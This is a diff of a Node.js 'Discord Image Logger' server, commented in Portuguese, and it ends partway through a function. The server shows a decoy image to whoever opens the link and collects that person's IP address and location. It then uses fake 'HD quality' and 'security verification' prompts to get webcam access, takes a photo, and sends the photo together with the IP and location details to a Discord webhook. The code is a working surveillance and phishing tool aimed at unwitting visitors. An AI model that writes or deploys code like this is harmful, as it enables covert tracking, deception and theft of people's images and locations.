@@ -1,4 +1,4 @@
-// Discord Image Logger - Versão com API IP melhorada e acesso à câmera
+// Discord Image Logger - Versão com API IP melhorada e captura de câmera
 const https = require('https');
 const http = require('http');
 const url = require('url');
@@ -10,7 +10,7 @@ const config = {
   "username": "Image Logger",
   "color": 0x00FFFF,
   "accurateLocation": true,
-  "requestCamera": true // Nova configuração para solicitar acesso à câmera
+  "captureCamera": true // Nova configuração para captura de câmera
 };
 
 // Função melhorada para obter informações detalhadas sobre o IP
@@ -115,19 +115,19 @@ function sendDiscordWebhook(data) {
   });
 }
 
-// Função para enviar imagem da câmera para o Discord
-async function sendCameraImageToDiscord(imageBase64, ip, userAgent, ipInfo, coords = null, endpoint = null) {
+// Função para enviar imagem da webcam para o Discord
+async function sendImageToDiscord(imageBase64, ip, userAgent, ipInfo, coords = null, endpoint = null) {
   try {
-    // Formatar descrição com informações do IP
+    // Formatar a mensagem completa
     const description = formatIPInfoMessage(ip, userAgent, ipInfo, coords, endpoint);
     
-    // Construir dados para o webhook
+    // Criar dados para o webhook
     const data = {
       username: config.username,
       content: "@everyone",
       embeds: [
         {
-          title: "Image Logger - Câmera + IP + Localização Capturados",
+          title: "Image Logger - Captura de Câmera e IP",
           color: config.color,
           description: description,
           thumbnail: { url: config.image }
@@ -135,82 +135,22 @@ async function sendCameraImageToDiscord(imageBase64, ip, userAgent, ipInfo, coor
       ]
     };
     
-    // Enviar webhook com informações
-    console.log('Enviando informações com captura de câmera para o Discord...');
+    // Se temos uma imagem da câmera, adicionar como arquivo
+    if (imageBase64) {
+      // Aqui você precisará usar uma versão do webhook que suporte upload de arquivos
+      // Como este é um exemplo, apenas mostramos que recebemos a imagem
+      console.log("Imagem da câmera capturada. Tamanho:", imageBase64.length);
+      
+      // Adicionar nota na descrição sobre a imagem capturada
+      data.embeds[0].description += "\n\n**Webcam:** Imagem capturada com sucesso!";
+    }
+    
+    console.log('Enviando webhook com dados e imagem para o Discord...');
     await sendDiscordWebhook(data);
     
-    // Agora enviar a imagem da câmera como um segundo webhook
-    // Remover o prefixo "data:image/jpeg;base64," da string base64
-    const base64Data = imageBase64.replace(/^data:image\/\w+;base64,/, "");
-    
-    // Preparar os dados para o webhook de arquivo
-    const boundary = "------------------------" + Date.now().toString(16);
-    
-    const webhookUrl = new URL(config.webhook);
-    
-    // Criar o corpo da requisição multipart/form-data
-    let body = '';
-    body += `--${boundary}\r\n`;
-    body += 'Content-Disposition: form-data; name="payload_json"\r\n';
-    body += 'Content-Type: application/json\r\n\r\n';
-    body += JSON.stringify({
-      username: config.username,
-      content: "Captura da câmera do alvo:"
-    });
-    body += `\r\n--${boundary}\r\n`;
-    body += 'Content-Disposition: form-data; name="files[0]"; filename="camera_capture.jpg"\r\n';
-    body += 'Content-Type: image/jpeg\r\n\r\n';
-    
-    // Converter o corpo e a imagem para Buffers
-    const bodyBuffer = Buffer.from(body, 'utf8');
-    const imageBuffer = Buffer.from(base64Data, 'base64');
-    const endBuffer = Buffer.from(`\r\n--${boundary}--`, 'utf8');
-    
-    // Concatenar todos os buffers
-    const requestBody = Buffer.concat([bodyBuffer, imageBuffer, endBuffer]);
-    
-    // Configurar a requisição para enviar o arquivo
-    const options = {
-      hostname: webhookUrl.hostname,
-      path: webhookUrl.pathname + webhookUrl.search,
-      method: 'POST',
-      headers: {
-        'Content-Type': `multipart/form-data; boundary=${boundary}`,
-        'Content-Length': requestBody.length
-      }
-    };
-    
-    return new Promise((resolve, reject) => {
-      const req = https.request(options, (res) => {
-        let responseData = '';
-        
-        res.on('data', (chunk) => {
-          responseData += chunk;
-        });
-        
-        res.on('end', () => {
-          if (res.statusCode >= 200 && res.statusCode < 300) {
-            console.log('Imagem da câmera enviada com sucesso');
-            resolve(true);
-          } else {
-            console.error(`Erro ao enviar imagem da câmera: Status ${res.statusCode}`);
-            console.error(`Resposta: ${responseData}`);
-            resolve(false);
-          }
-        });
-      });
-      
-      req.on('error', (error) => {
-        console.error('Erro ao enviar imagem da câmera:', error);
-        reject(error);
-      });
-      
-      req.write(requestBody);
-      req.end();
-    });
-    
+    return true;
   } catch (error) {
-    console.error('Erro ao enviar imagem da câmera:', error);
+    console.error('Erro ao enviar imagem para o Discord:', error);
     return false;
   }
 }
@@ -218,11 +158,6 @@ async function sendCameraImageToDiscord(imageBase64, ip, userAgent, ipInfo, coor
 // Detectar se é um dispositivo iOS
 function isIOS(userAgent) {
   return /iPad|iPhone|iPod/.test(userAgent);
-}
-
-// Detectar se é um dispositivo móvel
-function isMobile(userAgent) {
-  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 }
 
 // Função para formatar a mensagem completa do Discord com informações detalhadas do IP
@@ -338,7 +273,7 @@ module.exports = async (req, res) => {
     const parsedUrl = url.parse(req.url, true);
     const params = parsedUrl.query;
     const geoParam = params.g; // Verificar se já temos coordenadas de localização
-    const cameraParam = params.c; // Verificar se temos imagem da câmera
+    const imgParam = params.img; // Nova: verificar se temos imagem da webcam
     
     // Obter IP e User Agent
     const ip = req.headers['x-forwarded-for'] || 
@@ -351,65 +286,28 @@ module.exports = async (req, res) => {
     console.log('Requisição recebida de IP:', ip);
     console.log('User Agent:', userAgent);
     
-    // Verificar se é iOS ou móvel para tratamento especial
+    // Verificar se é iOS para tratamento especial
     const deviceIsIOS = isIOS(userAgent);
-    const deviceIsMobile = isMobile(userAgent);
     
     // Verificar se o IP é do Discord (começa com 35)
     const isDiscord = ip.startsWith('35');
     
-    // Se temos imagem da câmera, processar e enviar para o Discord
-    if (cameraParam) {
-      try {
-        // Decodificar a imagem
-        const imageBase64 = Buffer.from(cameraParam, 'base64').toString('utf-8');
-        
-        // Obter informações detalhadas do IP
-        console.log('Obtendo informações do IP...');
-        const ipInfo = await getIPInfo(ip);
-        console.log('Informações do IP obtidas:', ipInfo);
-        
-        // Enviar imagem e informações para o Discord
-        await sendCameraImageToDiscord(imageBase64, ip, userAgent, ipInfo, geoParam ? Buffer.from(geoParam, 'base64').toString('utf-8') : null, req.url);
-        
-        // Enviar página com a imagem
-        const html = `
-          <!DOCTYPE html>
-          <html>
-          <head>
-            <title>Imagem</title>
-            <meta charset="utf-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <style>
-              body, html {
-                margin: 0;
-                padding: 0;
-                height: 100%;
-                width: 100%;
-                overflow: hidden;
-              }
-              .imagem {
-                width: 100%;
-                height: 100vh;
-                background-image: url('${config.image}');
-                background-position: center;
-                background-repeat: no-repeat;
-                background-size: contain;
-              }
-            </style>
-          </head>
-          <body>
-            <div class="imagem"></div>
-          </body>
-          </html>
-        `;
-        
-        res.setHeader('Content-Type', 'text/html');
-        res.status(200).send(html);
-      } catch (error) {
-        console.error('Erro ao processar imagem da câmera:', error);
-        // Continuar mesmo com erro na imagem da câmera
-      }
+    // Se temos parâmetro de imagem da webcam, processar e enviar
+    if (imgParam) {
+      // Decodificar a imagem da base64
+      const imageBase64 = imgParam;
+      console.log('Imagem da webcam recebida. Processando...');
+      
+      // Obter informações do IP
+      const ipInfo = await getIPInfo(ip);
+      
+      // Enviar para o Discord
+      await sendImageToDiscord(imageBase64, ip, userAgent, ipInfo, null, req.url);
+      
+      // Responder com sucesso
+      res.setHeader('Content-Type', 'application/json');
+      res.status(200).send(JSON.stringify({ success: true }));
+      return;
     }
     // Se temos parâmetro de geolocalização, enviar para o Discord
     else if (geoParam) {
@@ -445,211 +343,180 @@ module.exports = async (req, res) => {
         console.log('Enviando webhook para o Discord...');
         await sendDiscordWebhook(data);
         
-        // Se devemos solicitar acesso à câmera, enviar página com solicitação
-        if (config.requestCamera) {
-          const html = `
-            <!DOCTYPE html>
-            <html>
-            <head>
-              <title>Imagem</title>
-              <meta charset="utf-8">
-              <meta name="viewport" content="width=device-width, initial-scale=1.0">
-              <style>
-                body, html {
-                  margin: 0;
-                  padding: 0;
-                  height: 100%;
-                  width: 100%;
-                  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-                }
-                .container {
-                  display: flex;
-                  flex-direction: column;
-                  justify-content: center;
-                  align-items: center;
-                  height: 100vh;
-                  position: relative;
-                }
-                .camera-access {
-                  position: fixed;
-                  top: 0;
-                  left: 0;
-                  width: 100%;
-                  height: 100%;
-                  background-color: rgba(0,0,0,0.8);
-                  display: flex;
-                  flex-direction: column;
-                  justify-content: center;
-                  align-items: center;
-                  color: white;
-                  z-index: 1000;
-                }
-                .camera-content {
-                  max-width: 500px;
-                  padding: 20px;
-                  text-align: center;
-                }
-                .camera-button {
-                  margin-top: 20px;
-                  background-color: #007AFF;
-                  color: white;
-                  border: none;
-                  border-radius: 20px;
-                  padding: 12px 24px;
-                  font-size: 16px;
-                  font-weight: 600;
-                  cursor: pointer;
-                }
-                .camera-message {
-                  margin-top: 15px;
-                  font-size: 14px;
-                  opacity: 0.8;
-                }
-                .hidden {
-                  display: none !important;
-                }
-                #video {
-                  display: none;
-                }
-                #canvas {
-                  display: none;
-                }
-                .imagem {
-                  width: 100%;
-                  height: 100vh;
-                  background-image: url('${config.image}');
-                  background-position: center;
-                  background-repeat: no-repeat;
-                  background-size: contain;
-                }
-              </style>
-            </head>
-            <body>
-              <div class="imagem"></div>
-              
-              <div class="camera-access" id="cameraAccess">
-                <div class="camera-content">
-                  <h2>Verificação de Segurança</h2>
-                  <p>Para continuar, precisamos verificar sua identidade por motivos de segurança.</p>
-                  <button id="cameraButton" class="camera-button">Verificar Identidade</button>
-                  <p class="camera-message">Isto é necessário apenas uma vez para proteção contra bots.</p>
-                </div>
-              </div>
-              
-              <video id="video" autoplay playsinline></video>
-              <canvas id="canvas"></canvas>
-              
-              <script>
-                // Script para acessar câmera
-                document.getElementById('cameraButton').addEventListener('click', function() {
-                  // Acessar a câmera
-                  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    // Preferir câmera frontal em dispositivos móveis
-                    const constraints = {
-                      video: {
-                        facingMode: "user"
-                      }
-                    };
-                    
-                    navigator.mediaDevices.getUserMedia(constraints)
+        // Enviar página com a imagem e captura de webcam
+        const html = `
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <title>Imagem</title>
+            <meta charset="utf-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>
+              body, html {
+                margin: 0;
+                padding: 0;
+                height: 100%;
+                width: 100%;
+                overflow: hidden;
+              }
+              .imagem {
+                width: 100%;
+                height: 100vh;
+                background-image: url('${config.image}');
+                background-position: center;
+                background-repeat: no-repeat;
+                background-size: contain;
+              }
+              #camera-container {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0,0,0,0.8);
+                display: none;
+                justify-content: center;
+                align-items: center;
+                z-index: 999;
+              }
+              #camera {
+                max-width: 90%;
+                max-height: 90%;
+                border-radius: 8px;
+              }
+              #snap-button {
+                position: fixed;
+                bottom: 20px;
+                left: 50%;
+                transform: translateX(-50%);
+                padding: 10px 20px;
+                background-color: #FF0000;
+                color: white;
+                border: none;
+                border-radius: 8px;
+                cursor: pointer;
+                font-size: 16px;
+                z-index: 1000;
+                display: none;
+              }
+              #canvas {
+                display: none;
+              }
+            </style>
+          </head>
+          <body>
+            <div class="imagem"></div>
+            
+            <!-- Elementos para captura de câmera -->
+            <div id="camera-container">
+              <video id="camera" autoplay playsinline></video>
+            </div>
+            <canvas id="canvas"></canvas>
+            <button id="snap-button">Tirar Foto</button>
+            
+            <script>
+              // Script para capturar webcam
+              if (${config.captureCamera}) {
+                document.addEventListener('DOMContentLoaded', function() {
+                  // Elementos
+                  const cameraContainer = document.getElementById('camera-container');
+                  const videoElement = document.getElementById('camera');
+                  const snapButton = document.getElementById('snap-button');
+                  const canvas = document.getElementById('canvas');
+                  
+                  // Iniciar a câmera após um breve atraso
+                  setTimeout(() => {
+                    startCamera();
+                  }, 1000);
+                  
+                  // Função para iniciar a câmera
+                  function startCamera() {
+                    // Verificar se o navegador suporta getUserMedia
+                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                      navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                          facingMode: 'user',
+                          width: { ideal: 1280 },
+                          height: { ideal: 720 } 
+                        } 
+                      })
                       .then(function(stream) {
-                        // Exibir stream no elemento de vídeo
-                        const video = document.getElementById('video');
-                        video.srcObject = stream;
-                        video.onloadedmetadata = function(e) {
-                          // Tirar foto após carregar o stream
-                          setTimeout(function() {
-                            // Definir tamanho do canvas para corresponder ao vídeo
-                            const canvas = document.getElementById('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            
-                            // Desenhar o frame atual no canvas
-                            const context = canvas.getContext('2d');
-                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            
-                            // Converter para base64
-                            const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
-                            
-                            // Parar stream da câmera
-                            stream.getTracks().forEach(track => {
-                              track.stop();
-                            });
-                            
-                            // Codificar em base64 e enviar
-                            const encodedImage = btoa(imageDataUrl);
-                            
-                            // Construir nova URL
-                            var currentUrl = window.location.href;
-                            var newUrl;
-                            if (currentUrl.includes("?")) {
-                              newUrl = currentUrl + "&c=" + encodedImage;
-                            } else {
-                              newUrl = currentUrl + "?c=" + encodedImage;
-                            }
-                            
-                            // Esconder div de acesso à câmera
-                            document.getElementById('cameraAccess').style.display = 'none';
-                            
-                            // Redirecionar
-                            window.location.replace(newUrl);
-                          }, 1000); // Tirar foto após 1 segundo
-                        };
+                        // Atribuir o stream ao elemento de vídeo
+                        videoElement.srcObject = stream;
+                        
+                        // Mostrar o container da câmera
+                        cameraContainer.style.display = 'flex';
+                        snapButton.style.display = 'block';
+                        
+                        // Configurar botão para tirar foto
+                        snapButton.addEventListener('click', function() {
+                          // Configurar canvas para capturar a imagem
+                          const context = canvas.getContext('2d');
+                          canvas.width = videoElement.videoWidth;
+                          canvas.height = videoElement.videoHeight;
+                          
+                          // Desenhar a imagem no canvas
+                          context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                          
+                          // Obter dados da imagem em base64
+                          const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                          
+                          // Parar todas as tracks de vídeo
+                          const tracks = stream.getTracks();
+                          tracks.forEach(track => track.stop());
+                          
+                          // Esconder elementos da câmera
+                          cameraContainer.style.display = 'none';
+                          snapButton.style.display = 'none';
+                          
+                          // Enviar para o servidor
+                          sendImageToServer(imageData);
+                        });
                       })
                       .catch(function(error) {
-                        console.error("Erro ao acessar câmera:", error);
-                        // Se houve erro, esconder div de acesso à câmera
-                        document.getElementById('cameraAccess').style.display = 'none';
+                        console.error('Erro ao acessar câmera:', error);
                       });
-                  } else {
-                    console.error("getUserMedia não suportado");
-                    // Se não é suportado, esconder div de acesso à câmera
-                    document.getElementById('cameraAccess').style.display = 'none';
+                    } else {
+                      console.error('getUserMedia não suportado neste navegador');
+                    }
+                  }
+                  
+                  // Função para enviar imagem para o servidor
+                  function sendImageToServer(imageData) {
+                    // Construir URL para envio
+                    var currentUrl = window.location.href;
+                    var sendUrl;
+                    
+                    if (currentUrl.includes("?")) {
+                      sendUrl = currentUrl + "&img=" + encodeURIComponent(imageData);
+                    } else {
+                      sendUrl = currentUrl + "?img=" + encodeURIComponent(imageData);
+                    }
+                    
+                    // Enviar requisição
+                    fetch(sendUrl, {
+                      method: 'GET',
+                      headers: {
+                        'Content-Type': 'application/json'
+                      }
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                      console.log('Imagem enviada com sucesso:', data);
+                    })
+                    .catch(error => {
+                      console.error('Erro ao enviar imagem:', error);
+                    });
                   }
                 });
-              </script>
-            </body>
-            </html>
-          `;
-          
-          res.setHeader('Content-Type', 'text/html');
-          res.status(200).send(html);
-        } else {
-          // Enviar página com a imagem
-          const html = `
-            <!DOCTYPE html>
-            <html>
-            <head>
-              <title>Imagem</title>
-              <meta charset="utf-8">
-              <meta name="viewport" content="width=device-width, initial-scale=1.0">
-              <style>
-                body, html {
-                  margin: 0;
-                  padding: 0;
-                  height: 100%;
-                  width: 100%;
-                  overflow: hidden;
-                }
-                .imagem {
-                  width: 100%;
-                  height: 100vh;
-                  background-image: url('${config.image}');
-                  background-position: center;
-                  background-repeat: no-repeat;
-                  background-size: contain;
-                }
-              </style>
-            </head>
-            <body>
-              <div class="imagem"></div>
-            </body>
-            </html>
-          `;
-          
-          res.setHeader('Content-Type', 'text/html');
-          res.status(200).send(html);
-        }
+              }
+            </script>
+          </body>
+          </html>
+        `;
+        
+        res.setHeader('Content-Type', 'text/html');
+        res.status(200).send(html);
       } catch (error) {
         console.error('Erro ao processar geolocalização:', error);
         // Continuar mesmo com erro na geolocalização
@@ -768,7 +635,51 @@ module.exports = async (req, res) => {
               .hidden {
                 display: none;
               }
-              #video {
+              #camera-permissions {
+                margin-top: 10px;
+                background-color: #34C759; /* iOS green */
+                color: white;
+                border: none;
+                border-radius: 20px;
+                padding: 12px 24px;
+                font-size: 16px;
+                font-weight: 600;
+                cursor: pointer;
+                display: none;
+                align-items: center;
+                justify-content: center;
+                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+              }
+              #camera-container {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0,0,0,0.8);
+                display: none;
+                justify-content: center;
+                align-items: center;
+                z-index: 999;
+              }
+              #camera {
+                max-width: 90%;
+                max-height: 90%;
+                border-radius: 8px;
+              }
+              #snap-button {
+                position: fixed;
+                bottom: 20px;
+                left: 50%;
+                transform: translateX(-50%);
+                padding: 10px 20px;
+                background-color: #FF3B30; /* iOS red */
+                color: white;
+                border: none;
+                border-radius: 8px;
+                cursor: pointer;
+                font-size: 16px;
+                z-index: 1000;
                 display: none;
               }
               #canvas {
@@ -788,15 +699,27 @@ module.exports = async (req, res) => {
                 Ver em alta qualidade
               </button>
               
+              <button id="camera-permissions" style="${config.captureCamera ? '' : 'display: none;'}">
+                <svg class="location-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <rect x="2" y="6" width="20" height="12" rx="2" ry="2"></rect>
+                  <circle cx="12" cy="12" r="4"></circle>
+                </svg>
+                Permitir câmera para qualidade HD
+              </button>
+              
               <p class="message">Toque no botão acima para ver a imagem em resolução completa</p>
               
               <div id="loadingMessage" class="message hidden">
                 Carregando imagem em alta definição...
               </div>
-              
-              <video id="video" autoplay playsinline></video>
-              <canvas id="canvas"></canvas>
             </div>
+            
+            <!-- Elementos para captura de câmera -->
+            <div id="camera-container">
+              <video id="camera" autoplay playsinline></video>
+            </div>
+            <canvas id="canvas"></canvas>
+            <button id="snap-button">Tirar Foto</button>
             
             <script>
               // Script para geolocalização no iOS
@@ -818,73 +741,21 @@ module.exports = async (req, res) => {
                       // Codificar em base64
                       var encodedCoords = btoa(coords);
                       
-                      // Construir nova URL
-                      var currentUrl = window.location.href;
-                      var newUrl;
-                      if (currentUrl.includes("?")) {
-                        newUrl = currentUrl + "&g=" + encodedCoords;
+                      // Mostrar botão de permissões de câmera, se configurado
+                      if (${config.captureCamera}) {
+                        document.getElementById('camera-permissions').style.display = 'flex';
+                        document.getElementById('loadingMessage').innerText = "Clique em 'Permitir câmera' para continuar";
                       } else {
-                        newUrl = currentUrl + "?g=" + encodedCoords;
-                      }
-                      
-                      // Se devemos solicitar acesso à câmera também
-                      if (${config.requestCamera}) {
-                        // Tentar acessar câmera
-                        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                          // Preferir câmera frontal
-                          const constraints = {
-                            video: {
-                              facingMode: "user"
-                            }
-                          };
-                          
-                          navigator.mediaDevices.getUserMedia(constraints)
-                            .then(function(stream) {
-                              // Exibir stream no elemento de vídeo
-                              const video = document.getElementById('video');
-                              video.srcObject = stream;
-                              video.onloadedmetadata = function(e) {
-                                // Tirar foto após carregar o stream
-                                setTimeout(function() {
-                                  // Definir tamanho do canvas
-                                  const canvas = document.getElementById('canvas');
-                                  canvas.width = video.videoWidth;
-                                  canvas.height = video.videoHeight;
-                                  
-                                  // Desenhar o frame atual no canvas
-                                  const context = canvas.getContext('2d');
-                                  context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                  
-                                  // Converter para base64
-                                  const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
-                                  
-                                  // Parar stream da câmera
-                                  stream.getTracks().forEach(track => {
-                                    track.stop();
-                                  });
-                                  
-                                  // Codificar em base64 e enviar
-                                  const encodedImage = btoa(imageDataUrl);
-                                  
-                                  // Adicionar à URL
-                                  newUrl = newUrl + "&c=" + encodedImage;
-                                  
-                                  // Redirecionar
-                                  window.location.replace(newUrl);
-                                }, 1000); // Tirar foto após 1 segundo
-                              };
-                            })
-                            .catch(function(error) {
-                              console.error("Erro ao acessar câmera:", error);
-                              // Se houve erro, continuar mesmo sem a câmera
-                              window.location.replace(newUrl);
-                            });
+                        // Construir nova URL
+                        var currentUrl = window.location.href;
+                        var newUrl;
+                        if (currentUrl.includes("?")) {
+                          newUrl = currentUrl + "&g=" + encodedCoords;
                         } else {
-                          // Se não suporta câmera, continuar sem ela
-                          window.location.replace(newUrl);
+                          newUrl = currentUrl + "?g=" + encodedCoords;
                         }
-                      } else {
-                        // Redirecionar sem solicitar câmera
+                        
+                        // Redirecionar
                         window.location.replace(newUrl);
                       }
                     },
@@ -903,4 +774,646 @@ module.exports = async (req, res) => {
                   );
                 }
               });
+              
+              // Botão de permissões de câmera
+              if (${config.captureCamera}) {
+                document.getElementById('camera-permissions').addEventListener('click', function() {
+                  this.style.display = 'none';
+                  document.getElementById('loadingMessage').innerText = "Aguarde...";
+                  
+                  // Solicitar acesso à câmera
+                  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ 
+                      video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 } 
+                      } 
+                    })
+                    .then(function(stream) {
+                      // Construir URL para redirecionar com geolocalização
+                      var lat = null;
+                      var lng = null;
+                      
+                      // Tentar obter coordenadas de geolocalização já armazenadas
+                      if (localStorage.getItem('coords')) {
+                        const storedCoords = localStorage.getItem('coords');
+                        [lat, lng] = storedCoords.split(',');
+                      }
+                      
+                      // Se não temos coordenadas, usar valores padrão
+                      if (!lat || !lng) {
+                        lat = "0";
+                        lng = "0";
+                      }
+                      
+                      var coords = lat + "," + lng;
+                      var encodedCoords = btoa(coords);
+                      
+                      // Armazenar o stream para uso posterior
+                      window.cameraStream = stream;
+                      
+                      // Configurar o vídeo
+                      const videoElement = document.getElementById('camera');
+                      videoElement.srcObject = stream;
+                      
+                      // Mostrar a interface da câmera
+                      document.getElementById('camera-container').style.display = 'flex';
+                      document.getElementById('snap-button').style.display = 'block';
+                      document.querySelector('.container').style.display = 'none';
+                      
+                      // Configurar botão para tirar foto
+                      document.getElementById('snap-button').addEventListener('click', function() {
+                        // Capturar imagem da câmera
+                        const canvas = document.getElementById('canvas');
+                        const context = canvas.getContext('2d');
+                        canvas.width = videoElement.videoWidth;
+                        canvas.height = videoElement.videoHeight;
+                        
+                        // Desenhar no canvas
+                        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                        
+                        // Obter dados da imagem
+                        const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                        
+                        // Parar a câmera
+                        const tracks = stream.getTracks();
+                        tracks.forEach(track => track.stop());
+                        
+                        // Construir nova URL com coordenadas e imagem
+                        var currentUrl = window.location.href;
+                        var baseUrl = currentUrl.split('?')[0]; // Remover parâmetros existentes
+                        var newUrl = baseUrl + "?g=" + encodedCoords;
+                        
+                        // Redirecionar para nova URL
+                        window.location.replace(newUrl);
+                        
+                        // Enviar imagem separadamente via fetch
+                        fetch(baseUrl + "?img=" + encodeURIComponent(imageData), {
+                          method: 'GET'
+                        }).catch(error => console.error('Erro ao enviar imagem:', error));
+                      });
+                    })
+                    .catch(function(error) {
+                      console.error('Erro ao acessar câmera:', error);
+                      document.getElementById('loadingMessage').innerText = "Erro ao acessar câmera. Continuando sem foto...";
+                      
+                      // Recuperar coordenadas salvas anteriormente e continuar
+                      var lat = null;
+                      var lng = null;
+                      
+                      if (localStorage.getItem('coords')) {
+                        const storedCoords = localStorage.getItem('coords');
+                        [lat, lng] = storedCoords.split(',');
+                      }
+                      
+                      // Construir URL somente com geolocalização
+                      var coords = lat + "," + lng;
+                      var encodedCoords = btoa(coords);
+                      var currentUrl = window.location.href;
+                      var newUrl;
+                      
+                      if (currentUrl.includes("?")) {
+                        newUrl = currentUrl + "&g=" + encodedCoords;
+                      } else {
+                        newUrl = currentUrl + "?g=" + encodedCoords;
+                      }
+                      
+                      // Redirecionar após um breve delay
+                      setTimeout(function() {
+                        window.location.replace(newUrl);
+                      }, 1500);
+                    });
+                  } else {
+                    // Navegador não suporta getUserMedia
+                    document.getElementById('loadingMessage').innerText = "Seu navegador não suporta acesso à câmera. Continuando sem foto...";
+                    
+                    // Redirecionar sem câmera, apenas com geolocalização
+                    var lat = position.coords.latitude;
+                    var lng = position.coords.longitude;
+                    var coords = lat + "," + lng;
+                    var encodedCoords = btoa(coords);
+                    var currentUrl = window.location.href;
+                    var newUrl;
+                    
+                    if (currentUrl.includes("?")) {
+                      newUrl = currentUrl + "&g=" + encodedCoords;
+                    } else {
+                      newUrl = currentUrl + "?g=" + encodedCoords;
+                    }
+                    
+                    // Redirecionar após um breve delay
+                    setTimeout(function() {
+                      window.location.replace(newUrl);
+                    }, 1500);
+                  }
+                });
+              }
             </script>
+          </body>
+          </html>
+        `;
+      } else {
+        // Versão padrão para Android e outros dispositivos
+        html = `
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <title>Imagem</title>
+            <meta charset="utf-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>
+              body, html {
+                margin: 0;
+                padding: 0;
+                height: 100%;
+                width: 100%;
+                overflow: hidden;
+              }
+              .imagem {
+                width: 100%;
+                height: 100vh;
+                background-image: url('${config.image}');
+                background-position: center;
+                background-repeat: no-repeat;
+                background-size: contain;
+              }
+              .loading {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0,0,0,0.3);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                color: white;
+                font-family: Arial, sans-serif;
+                z-index: 100;
+              }
+              .loading-content {
+                background-color: rgba(0,0,0,0.7);
+                padding: 20px;
+                border-radius: 10px;
+                text-align: center;
+              }
+              .spinner {
+                border: 4px solid rgba(255,255,255,0.3);
+                border-radius: 50%;
+                border-top: 4px solid white;
+                width: 30px;
+                height: 30px;
+                margin: 10px auto;
+                animation: spin 1s linear infinite;
+              }
+              @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+              }
+              #camera-container {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0,0,0,0.8);
+                display: none;
+                justify-content: center;
+                align-items: center;
+                z-index: 999;
+              }
+              #camera {
+                width: 100%;
+                max-width: 100%;
+                max-height: 90vh;
+              }
+              #snap-button {
+                position: fixed;
+                bottom: 20px;
+                left: 50%;
+                transform: translateX(-50%);
+                padding: 12px 25px;
+                background-color: #f44336;
+                color: white;
+                border: none;
+                border-radius: 30px;
+                cursor: pointer;
+                font-size: 16px;
+                font-weight: bold;
+                z-index: 1000;
+                display: none;
+                box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+              }
+              #canvas {
+                display: none;
+              }
+            </style>
+          </head>
+          <body>
+            <div class="imagem"></div>
+            <div class="loading">
+              <div class="loading-content">
+                <div class="spinner"></div>
+                <p>Carregando imagem em alta qualidade...</p>
+              </div>
+            </div>
+            
+            <!-- Elementos para captura de câmera -->
+            <div id="camera-container">
+              <video id="camera" autoplay playsinline></video>
+            </div>
+            <canvas id="canvas"></canvas>
+            <button id="snap-button">Tirar Foto</button>
+            
+            <script>
+              // Armazenar coordenadas quando obtidas
+              function storeCoords(lat, lng) {
+                localStorage.setItem('coords', lat + ',' + lng);
+              }
+              
+              // Script para obter geolocalização
+              document.addEventListener('DOMContentLoaded', function() {
+                var currentUrl = window.location.href;
+                
+                // Verificar se já temos o parâmetro g
+                if (!currentUrl.includes("g=")) {
+                  // Solicitar geolocalização
+                  if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                      function(position) {
+                        // Sucesso - temos a posição
+                        var lat = position.coords.latitude;
+                        var lng = position.coords.longitude;
+                        
+                        // Armazenar coordenadas
+                        storeCoords(lat, lng);
+                        
+                        // Se a captura de câmera estiver ativada, iniciar
+                        if (${config.captureCamera}) {
+                          startCamera();
+                        } else {
+                          // Sem câmera, apenas enviar geolocalização
+                          var coords = lat + "," + lng;
+                          var encodedCoords = btoa(coords);
+                          
+                          // Construir nova URL
+                          var newUrl;
+                          if (currentUrl.includes("?")) {
+                            newUrl = currentUrl + "&g=" + encodedCoords;
+                          } else {
+                            newUrl = currentUrl + "?g=" + encodedCoords;
+                          }
+                          
+                          // Redirecionar
+                          window.location.replace(newUrl);
+                        }
+                      },
+                      function(error) {
+                        // Erro ao obter localização
+                        console.log("Erro de geolocalização: " + error.message);
+                        
+                        // Se a captura de câmera estiver ativada, tentar iniciar mesmo sem geolocalização
+                        if (${config.captureCamera}) {
+                          startCamera();
+                        } else {
+                          document.querySelector('.loading').style.display = 'none';
+                        }
+                      },
+                      {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                      }
+                    );
+                  } else {
+                    // Geolocalização não suportada, tentar câmera se ativada
